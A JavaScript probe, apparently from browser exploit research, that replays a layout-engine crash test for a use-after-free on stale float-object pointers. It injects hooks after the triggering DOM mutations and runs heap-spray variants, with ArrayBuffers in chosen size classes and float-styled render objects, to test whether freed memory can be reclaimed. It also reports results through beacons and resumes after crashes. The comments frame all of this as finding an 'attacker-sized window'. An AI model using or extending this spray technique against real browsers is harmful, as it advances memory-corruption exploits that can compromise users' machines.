// fa-sink4 — exact replicate of corpus case 176 (stale float map, BZ 272488)
//
// The crash test's script ends with the two mutations that trigger the kill:
//     outer.classList.remove("flow");
//     container.classList.remove("vrl");
// and the deadly layout runs as the automatic post-script rendering update.
// Everything between the last mutation and that update is pure JS — an
// attacker-sized window. This probe loads the EXACT corpus file, injects a
// spray hook after the LAST mutation, and runs three variants:
//
//   baseline — no spray: the kill must replicate (corpus: 1/1)
//   abspray  — ArrayBuffers 64-1024 in the window (FloatingObject/map-entry
//              size classes)
//   divspray — 200 spans+objects created INSIDE the iframe (float-family
//              render objects: object { float: inline-end })
//
// Also beacons: MAIN (script start), PRE (after the first layout read),
// WINDOW (after the last mutation — the spray moment). A kill AFTER a
// delivered WINDOW beacon proves the window; a spray that changes the
// outcome proves the reclaim potential.
//
// The bug (fix 7edad1b0d5e5, embargoed origin, security CC'd):
// rebuildFloatingObjectSetFromIntrudingFloats() moved old floating objects
// into a RendererToFloatInfoMap keyed by RAW RenderBox* pointers and
// compared stale float geometry across the rebuild — dangling renderer
// pointers, attacker-shaped.
//
// Crash-resume via localStorage (killed steps skipped on reload).
// Beacon prefix: VS4-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VS4-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  var TEST_URL = BASE + '/corpus/LayoutTests_fast_block_crash-when-style-and-renderer-invalidated-for-floating-object-element.html';

  function runVariant(name, sprayFn, next) {
    B('V-' + name + '-START');
    var xhr = new XMLHttpRequest();
    xhr.open('GET', TEST_URL + '?t=' + Date.now(), true);
    xhr.onload = function() {
      var src = xhr.responseText;
      src = src.replace('if (window.testRunner)', 'if (false)');
      // script-entry hook
      src = src.replace('  inner.append(div.cloneNode());',
        'if (window.parent && window.parent.__mainHook) window.parent.__mainHook();\n  inner.append(div.cloneNode());');
      // the LAST mutation: inject the spray hook right after it
      var needle = 'container.classList.remove("vrl");';
      if (src.indexOf(needle) < 0) {
        B('V-' + name + '-NOHOOK');
        setTimeout(next, 300);
        return;
      }
      src = src.replace(needle,
        needle + '\nif (window.parent && window.parent.__sprayHook) window.parent.__sprayHook();');
      // force the deadly layout explicitly AFTER the spray (the automatic
      // update would run it anyway — this pins the order: mutation, spray, layout)
      src = src.replace('<\/script>',
        'if (window.parent && window.parent.__sprayHook) window.parent.__sprayHook();\n  inner.scrollLeft;\n<\/script>');

      var frame = document.createElement('iframe');
      frame.style.cssText = 'width:320px;height:200px';
      document.body.appendChild(frame);
      var doc = frame.contentDocument;
      window.__mainHook = function() { B('V-' + name + '-MAIN'); };
      window.__sprayHook = function() {
        if (window.__sprayFired) return;
        window.__sprayFired = true;
        B('V-' + name + '-WINDOW');
        try { sprayFn(frame); } catch (e) { B('V-' + name + '-SPRAY-X'); }
      };
      doc.open();
      doc.write(src);
      doc.close();
      var guard = 0;
      var timer = setInterval(function() {
        guard++;
        if (guard > 16) {
          clearInterval(timer);
          B('V-' + name + '-SURVIVED', 'secs=' + (guard / 2));
          try { frame.parentNode.removeChild(frame); } catch (e) {}
          setTimeout(next, 300);
        }
      }, 500);
      var watch = setInterval(function() {
        try {
          var t = doc.body ? doc.body.textContent : '';
          if (t.indexOf('PASS') >= 0) {
            clearInterval(watch); clearInterval(timer);
            B('V-' + name + '-DONE');
            try { frame.parentNode.removeChild(frame); } catch (e) {}
            setTimeout(next, 300);
          }
        } catch (e) { clearInterval(watch); }
      }, 250);
    };
    xhr.onerror = function() { B('V-' + name + '-FETCH-X'); setTimeout(next, 300); };
    xhr.send();
    window.__sprayFired = false;
  }

  var AB_SIZES = [64, 96, 128, 160, 192, 256, 320, 384, 512, 768, 1024];
  function sprayABs(frame) {
    var keep = [];
    for (var s = 0; s < AB_SIZES.length; s++)
      for (var c = 0; c < 40; c++) keep.push(new ArrayBuffer(AB_SIZES[s]));
    window.__abKeep = keep;
  }
  function sprayFloats(frame) {
    // inside the IFRAME: spans + objects with the test's float CSS —
    // float-family render objects and FloatingObject allocations
    var d = frame.contentDocument;
    if (!d) return;
    var keep = [];
    for (var i = 0; i < 150; i++) {
      var o = d.createElement('object');
      keep.push(o);
      d.body.appendChild(o);
    }
    for (var j = 0; j < 150; j++) {
      var sp = d.createElement('span');
      sp.style.cssText = 'float:inline-end;width:10px;height:10px';
      keep.push(sp);
      d.body.appendChild(sp);
    }
    window.__floatKeep = keep;
    d.body.offsetHeight; // attach the spray renderers
  }

  // ── plan with localStorage crash-resume ────────────────────────────────
  var STEP_KEY = 'vs4-step-v1';
  var startStep = 0;
  try { startStep = parseInt(localStorage.getItem(STEP_KEY) || '0', 10) || 0; } catch (e) {}
  function saveStep(i) {
    try { localStorage.setItem(STEP_KEY, String(i)); } catch (e) {}
  }

  var VARIANTS = [
    ['baseline', function() {}],
    ['abspray', sprayABs],
    ['divspray', sprayFloats]
  ];

  B('PLAN', 'steps=' + VARIANTS.length + ' from=' + startStep);
  setTimeout(function() {
    var idx = startStep;
    function step() {
      var v = VARIANTS[idx];
      if (!v) { B('DONE-ALL-SURVIVED'); return; }
      saveStep(idx + 1);
      window.__sprayFired = false;
      runVariant(v[0], v[1], function() { idx++; step(); });
    }
    step();
  }, 200);
})();
